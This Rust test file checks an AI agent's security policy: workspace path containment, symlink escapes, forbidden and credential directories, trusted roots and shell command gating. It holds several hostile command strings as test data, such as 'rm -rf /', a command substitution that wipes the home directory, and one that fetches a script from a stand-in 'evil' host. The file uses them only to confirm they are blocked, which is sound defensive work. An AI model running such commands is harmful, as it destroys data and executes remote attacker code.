use super::*;

// ── validate_path_within_root ─────────────────────────────────────────────

#[test]
fn validate_path_within_root_allows_contained_path() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("prompt.md");
    std::fs::write(&file, b"hello").unwrap();
    let result = validate_path_within_root(&file, root.path());
    assert!(result.is_ok(), "contained path must be allowed: {result:?}");
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[test]
fn validate_path_within_root_blocks_parent_traversal() {
    let root = tempfile::tempdir().unwrap();
    let subdir = root.path().join("prompts");
    std::fs::create_dir(&subdir).unwrap();
    // Create a file one level above the prompts subdir but still within root.
    let victim = root.path().join("secret.txt");
    std::fs::write(&victim, b"secret").unwrap();
    // Construct a traversal path: <root>/prompts/../secret.txt
    let traversal = subdir.join("..").join("secret.txt");
    // With the prompts dir as root, the traversal must be blocked.
    let result = validate_path_within_root(&traversal, &subdir);
    assert!(
        result.is_err(),
        "path escaping root via '..' must be blocked"
    );
}

#[test]
fn validate_path_within_root_blocks_absolute_escape() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("a.md");
    std::fs::write(&file, b"x").unwrap();
    // Use a completely different tempdir as the root — file is outside it.
    let other_root = tempfile::tempdir().unwrap();
    let result = validate_path_within_root(&file, other_root.path());
    assert!(
        result.is_err(),
        "path outside root must be blocked: {result:?}"
    );
}

#[test]
fn validate_path_within_root_fails_on_nonexistent_candidate() {
    let root = tempfile::tempdir().unwrap();
    let missing = root.path().join("does_not_exist.md");
    // canonicalize() will fail — we expect an error, not a panic.
    let result = validate_path_within_root(&missing, root.path());
    assert!(
        result.is_err(),
        "non-existent candidate must return an error"
    );
}

#[test]
fn validate_path_within_root_blocks_symlink_escape() {
    let root = tempfile::tempdir().unwrap();
    let prompts_dir = root.path().join("prompts");
    std::fs::create_dir(&prompts_dir).unwrap();
    // Create a target file outside the prompts dir.
    let outside = root.path().join("outside.txt");
    std::fs::write(&outside, b"sensitive").unwrap();
    // Create a symlink inside prompts/ pointing outside.
    let link = prompts_dir.join("evil.md");
    #[cfg(unix)]
    std::os::unix::fs::symlink(&outside, &link).unwrap();
    #[cfg(not(unix))]
    {
        // Skip symlink test on non-Unix where symlink creation may require
        // elevated privileges.
        return;
    }
    let result = validate_path_within_root(&link, &prompts_dir);
    assert!(
        result.is_err(),
        "symlink escaping prompt root must be blocked"
    );
}

// ── validate_path / validate_parent_path (async) ────────────────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_outside_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let secret = outside.path().join("secret.txt");
    std::fs::write(&secret, "secret").unwrap();
    let link = workspace.path().join("link.txt");
    std::os::unix::fs::symlink(&secret, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_forbidden_path() {
    let workspace = tempfile::tempdir().unwrap();
    // /etc/hostname is readable on most Unix systems
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink("/etc/hostname", &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["/etc".to_string()],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link").await.is_err());
}

#[tokio::test]
async fn validate_path_allows_regular_file_in_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let file = workspace.path().join("data.txt");
    std::fs::write(&file, "hello").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_path("data.txt").await;
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[tokio::test]
async fn validate_path_returns_err_for_nonexistent_path() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("does_not_exist.txt").await.is_err());
}

#[tokio::test]
async fn validate_parent_path_allows_new_file() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_parent_path("newfile.txt").await;
    assert!(result.is_ok());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_symlinked_parent_dir() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let link_dir = workspace.path().join("subdir");
    std::os::unix::fs::symlink(outside.path(), &link_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy
        .validate_parent_path("subdir/newfile.txt")
        .await
        .is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_relative_forbidden_entry() {
    // Regression: relative forbidden entries (e.g. "secrets") must match after
    // canonicalization. Before the fix, "secrets" was never resolved against the
    // workspace root, so workspace/link -> workspace/secrets/ passed the check.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let secret_file = secrets_dir.join("token.txt");
    std::fs::write(&secret_file, "s3cr3t").unwrap();
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink(&secrets_dir, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Direct path into the forbidden dir is blocked.
    assert!(policy.validate_path("secrets/token.txt").await.is_err());
    // Symlink that resolves into the forbidden dir is also blocked.
    assert!(policy.validate_path("link/token.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_forbidden_path() {
    // Covers lines 888-896: the forbidden-path check inside validate_parent_path.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Writing a new file directly into the forbidden dir must be blocked.
    assert!(policy
        .validate_parent_path("secrets/output.csv")
        .await
        .is_err());
}

// ── tilde expansion in validate_path / validate_parent_path ──────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_expands_tilde_before_workspace_join() {
    // ~/... must be resolved against the real home dir, not literally joined onto
    // workspace_dir. With workspace_only:false and no forbidden entries, is_path_string_allowed
    // passes ~/file. After tilde expansion the file is outside the temp workspace, so we
    // expect "Resolved path escapes workspace" — not "Failed to resolve path" (which would
    // indicate the literal ~/... was appended to workspace_dir and canonicalize failed there).
    let workspace = tempfile::tempdir().unwrap();
    let home = dirs::home_dir().unwrap();
    let target = home.join("openhuman_tilde_validate_path_test.txt");
    std::fs::write(&target, "test").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_path("~/openhuman_tilde_validate_path_test.txt")
        .await
        .unwrap_err();
    let _ = std::fs::remove_file(&target);
    assert!(
        err.contains("Resolved path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_expands_tilde_before_workspace_join() {
    // Same as above but for validate_parent_path: writing ~/new_file.txt in
    // non-workspace-only mode must escape-check via the real home path, not a literal ~/
    // inside workspace_dir.
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        action_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_parent_path("~/openhuman_tilde_validate_parent_test.txt")
        .await
        .unwrap_err();
    assert!(
        err.contains("Resolved parent path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}

#[tokio::test]
async fn trusted_read_root_allows_read_outside_workspace() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let file = outside.join("data.txt");
    fs::write(&file, "hi").unwrap();
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::Read,
        }],
    );
    let resolved = policy.validate_path(file.to_str().unwrap()).await;
    assert!(
        resolved.is_ok(),
        "read in trusted root should succeed: {resolved:?}"
    );
}

#[tokio::test]
async fn trusted_read_root_blocks_write() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::Read,
        }],
    );
    let target = outside.join("new.txt");
    let err = policy
        .validate_parent_path(target.to_str().unwrap())
        .await
        .expect_err("write into a read-only trusted root must be rejected");
    assert!(err.contains("escapes workspace"), "got: {err}");
}

#[tokio::test]
async fn trusted_readwrite_root_allows_write() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    let target = outside.join("new.txt");
    let resolved = policy.validate_parent_path(target.to_str().unwrap()).await;
    assert!(
        resolved.is_ok(),
        "write in ReadWrite trusted root should succeed: {resolved:?}"
    );
}

#[tokio::test]
async fn credential_dir_blocked_even_inside_trusted_root() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let ssh = outside.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let key = ssh.join("id_rsa");
    fs::write(&key, "SECRET").unwrap();
    // Grant the entire `outside` tree read+write …
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    // … the credential store inside it must still be unreachable.
    let err = policy
        .validate_path(key.to_str().unwrap())
        .await
        .expect_err("~/.ssh-style dir must stay blocked even inside a trusted root");
    assert!(
        err.contains("not allowed") || err.contains("credential"),
        "got: {err}"
    );
}

#[tokio::test]
async fn path_outside_workspace_and_roots_blocked() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let file = outside.join("data.txt");
    fs::write(&file, "hi").unwrap();
    // No trusted roots granted — outside the workspace stays blocked.
    let policy = trusted_policy(workspace, vec![]);
    let err = policy
        .validate_path(file.to_str().unwrap())
        .await
        .expect_err("ungranted path outside workspace must be blocked");
    assert!(
        err.contains("not allowed") || err.contains("escapes"),
        "got: {err}"
    );
}

#[test]
fn is_within_trusted_root_write_requires_readwrite() {
    let policy = trusted_policy(
        StdPathBuf::from("/ws"),
        vec![TrustedRoot {
            path: "/data".into(),
            access: TrustedAccess::Read,
        }],
    );
    assert!(policy.is_within_trusted_root(StdPath::new("/data/sub/x"), false));
    assert!(!policy.is_within_trusted_root(StdPath::new("/data/sub/x"), true));
    assert!(!policy.is_within_trusted_root(StdPath::new("/elsewhere/x"), false));
}

#[test]
fn trusted_root_never_matches_credential_components() {
    let policy = trusted_policy(
        StdPathBuf::from("/ws"),
        vec![TrustedRoot {
            path: "/home/me".into(),
            access: TrustedAccess::ReadWrite,
        }],
    );
    assert!(policy.is_within_trusted_root(StdPath::new("/home/me/proj/file"), false));
    assert!(!policy.is_within_trusted_root(StdPath::new("/home/me/.aws/credentials"), false));
}

// -- Full access bypasses the command allowlist (access modes) ---------------

#[test]
fn full_access_bypasses_command_allowlist() {
    let p = full_policy();
    // `mkdir` is NOT in the default allowed_commands, but Full bypasses the allowlist.
    assert!(p.is_command_allowed("mkdir -p foo/bar"));
    // Redirects / pipes / subshells that Supervised blocks are allowed under Full.
    assert!(p.is_command_allowed("ls -la 2>/dev/null || echo none"));
    assert!(p.is_command_allowed("echo hi > out.txt"));
    assert!(p.is_command_allowed("python3 build.py && node serve.js"));
}

#[test]
fn supervised_still_enforces_command_allowlist() {
    let p = default_policy(); // Supervised
    assert!(p.is_command_allowed("mkdir -p foo/bar")); // allow-listed (expanded in #2486)
    assert!(!p.is_command_allowed("ls 2>/dev/null")); // redirect blocked
    assert!(p.is_command_allowed("ls -la")); // allow-listed, no redirect
}

#[test]
fn full_access_still_blocks_high_risk_when_configured() {
    // Full bypasses the allowlist in is_command_allowed, but validate_command_execution
    // still blocks high-risk commands while block_high_risk_commands is true.
    let p = full_policy();
    assert!(p.is_command_allowed("rm -rf /"));
    let result = p.validate_command_execution("rm -rf /", false);
    assert!(
        result.is_err(),
        "high-risk command must still be blocked in Full when block_high_risk_commands=true"
    );
}

#[test]
fn supervised_runs_approved_redirects_but_blocks_hidden_execution() {
    // Regression for the "approved shell command never runs" loop: redirects
    // like `2>&1` / `2>/dev/null` / `> file` and pipes MUST NOT be hard-blocked
    // in Supervised. `classify_command` already lifts a redirect to Write so the
    // gate prompted on it; once the human approves, `check_gated_command` (run
    // inside the tool, after approval) must let the command actually run.
    let p = default_policy(); // Supervised
    assert!(
        p.check_gated_command("python3 -c \"import yfinance\" 2>&1")
            .is_ok(),
        "stderr-dup redirect 2>&1 must run after approval"
    );
    assert!(p
        .check_gated_command("pip show yfinance 2>/dev/null")
        .is_ok());
    assert!(p.check_gated_command("ls -la | grep foo").is_ok());
    assert!(p.check_gated_command("echo done > out.txt").is_ok());

    // Hidden execution that `classify_command` can't see (it only reads each
    // segment's base command) stays blocked outside Full:
    assert!(
        p.check_gated_command("echo $(rm -rf ~)").is_err(),
        "command substitution can hide an unseen command"
    );
    assert!(p.check_gated_command("echo `whoami`").is_err());
    assert!(p.check_gated_command("cat <(curl http://evil/sh)").is_err());
    assert!(
        p.check_gated_command("sleep 100 & rm -rf important")
            .is_err(),
        "a standalone & can run a second command the prompt wouldn't show"
    );

    // Full is documented full-trust and skips the structural guard entirely.
    assert!(full_policy().check_gated_command("echo $(date)").is_ok());
}

/// The default projects home (`~/OpenHuman/projects`) must always be a
/// read-write trusted root on a policy built from config — `from_config` is the
/// one autonomy→policy chokepoint every agent session uses, so the grant can't
/// depend on the channels-startup path (skipped on web-chat-only cores).
#[test]
fn from_config_grants_default_projects_dir_as_readwrite_root() {
    let cfg = crate::openhuman::config::AutonomyConfig::default();
    let policy =
        SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"), StdPath::new("/tmp/ws"));
    let projects = crate::openhuman::config::default_projects_dir()
        .to_string_lossy()
        .to_string();
    assert!(
        policy
            .trusted_roots
            .iter()
            .any(|r| r.path == projects && matches!(r.access, TrustedAccess::ReadWrite)),
        "from_config must grant {projects} as a read-write trusted root; got: {:?}",
        policy.trusted_roots
    );
}

/// A user-granted projects root is left untouched (no duplicate, access kept).
#[test]
fn from_config_does_not_duplicate_user_granted_projects_root() {
    let projects = crate::openhuman::config::default_projects_dir()
        .to_string_lossy()
        .to_string();
    let cfg = crate::openhuman::config::AutonomyConfig {
        trusted_roots: vec![TrustedRoot {
            path: projects.clone(),
            access: TrustedAccess::Read,
        }],
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let policy =
        SecurityPolicy::from_config(&cfg, StdPath::new("/tmp/ws"), StdPath::new("/tmp/ws"));
    let matches: Vec<_> = policy
        .trusted_roots
        .iter()
        .filter(|r| r.path == projects)
        .collect();
    assert_eq!(matches.len(), 1, "must not duplicate an existing entry");
    assert!(
        matches!(matches[0].access, TrustedAccess::Read),
        "must preserve the user-granted access level"
    );
}

// -- canonical_workspace cache ------------------------------------

/// `validate_path` previously called `tokio::fs::canonicalize(&workspace_dir)`
/// inline on every invocation. The `canonical_workspace` OnceCell now memoizes
/// that result. This test pins the contract: the cell starts empty, is
/// populated after the first `validate_path` call, and stays populated (same
/// value) across subsequent calls — i.e. only one canonicalize per policy.
#[tokio::test]
async fn validate_path_caches_canonical_workspace_root() {
    let tmp = tempfile::tempdir().unwrap();
    let workspace = tmp.path().to_path_buf();
    let file = workspace.join("hello.txt");
    std::fs::write(&file, "hi").unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        action_dir: workspace.clone(),
        // Disable workspace_only so we can refer to the temp workspace via
        // its absolute path (the default policy blocks any absolute path
        // when workspace_only=true). Clear forbidden_paths for the same
        // reason — macOS tempdirs live under `/var/folders/…`.
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // Empty before first use.
    assert!(
        policy.canonical_workspace.get().is_none(),
        "OnceCell must start empty so the first call hydrates it"
    );

    // First call hydrates the cache.
    let r1 = policy
        .validate_path(file.to_str().unwrap())
        .await
        .expect("first validate_path call succeeds");
    let cached_after_first = policy
        .canonical_workspace
        .get()
        .expect("first validate_path call must hydrate the OnceCell")
        .clone();

    // Subsequent calls reuse the cached value without re-canonicalizing.
    for _ in 0..5 {
        let r = policy
            .validate_path(file.to_str().unwrap())
            .await
            .expect("repeated validate_path calls succeed");
        assert_eq!(r, r1, "validate_path result must be stable across calls");
        let cached_now = policy
            .canonical_workspace
            .get()
            .expect("OnceCell stays populated after first hydration");
        assert_eq!(
            cached_now, &cached_after_first,
            "cached workspace root must not change across calls"
        );
    }
}

/// The synchronous path validators (`is_path_string_allowed`,
/// `is_resolved_path_allowed_for`) previously re-canonicalized `workspace_dir`
/// on every call. `workspace_root_sync` now hydrates the **same**
/// `canonical_workspace` cell the async `workspace_root` uses. This pins that
/// the sync helper populates the cell once, reuses it, and agrees byte-for-byte
/// with the async path — one cache, both paths converge on one value.
#[tokio::test]
async fn workspace_root_sync_hydrates_and_shares_the_async_cache() {
    let tmp = tempfile::tempdir().unwrap();
    let workspace = tmp.path().to_path_buf();
    let expected = workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.clone());

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        action_dir: workspace.clone(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // Empty before first use.
    assert!(
        policy.canonical_workspace.get().is_none(),
        "OnceCell must start empty so the first sync call hydrates it"
    );

    // First sync call resolves the canonical workspace and hydrates the cell.
    let r1 = policy.workspace_root_sync();
    assert_eq!(r1, expected, "sync helper returns the canonical workspace");
    assert_eq!(
        policy.canonical_workspace.get(),
        Some(&expected),
        "sync helper must hydrate the shared canonical_workspace cell"
    );

    // Repeated sync calls reuse the cached value.
    for _ in 0..5 {
        assert_eq!(
            policy.workspace_root_sync(),
            r1,
            "sync workspace root must be stable across calls"
        );
    }

    // The async path reuses the SAME cell the sync call populated — no second
    // canonicalize, and both paths agree on one value.
    assert_eq!(
        policy.workspace_root().await,
        r1,
        "async workspace_root must return the value the sync helper cached"
    );

    // Behavior preserved through the swapped call site: a path under the
    // canonical workspace is still allowed.
    assert!(
        policy.is_resolved_path_allowed(&expected.join("note.txt")),
        "a path inside the workspace stays allowed after the cache swap"
    );
}

/// `validate_parent_path` shares the same cache as `validate_path` — both go
/// through `workspace_root()`. Hydrating via either entry point must be
/// observable from the other.
#[tokio::test]
async fn validate_parent_path_uses_same_cache_as_validate_path() {
    let tmp = tempfile::tempdir().unwrap();
    let workspace = tmp.path().to_path_buf();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        action_dir: workspace.clone(),
        // Disable workspace_only so we can refer to the temp workspace via
        // its absolute path (the default policy blocks any absolute path
        // when workspace_only=true). Clear forbidden_paths for the same
        // reason — macOS tempdirs live under `/var/folders/…`.
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // Empty before first use.
    assert!(policy.canonical_workspace.get().is_none());

    // Hydrate via validate_parent_path (target file does not exist yet).
    let target = workspace.join("not-yet-written.txt");
    let _ = policy
        .validate_parent_path(target.to_str().unwrap())
        .await
        .expect("validate_parent_path succeeds against an extant parent");
    let cached = policy
        .canonical_workspace
        .get()
        .expect("validate_parent_path must also hydrate the OnceCell")
        .clone();

    // A subsequent validate_path call must see the same cached root.
    let other = workspace.join("hi.txt");
    std::fs::write(&other, "x").unwrap();
    let _ = policy.validate_path(other.to_str().unwrap()).await.unwrap();
    assert_eq!(
        policy.canonical_workspace.get(),
        Some(&cached),
        "validate_path must reuse the cache hydrated by validate_parent_path"
    );
}
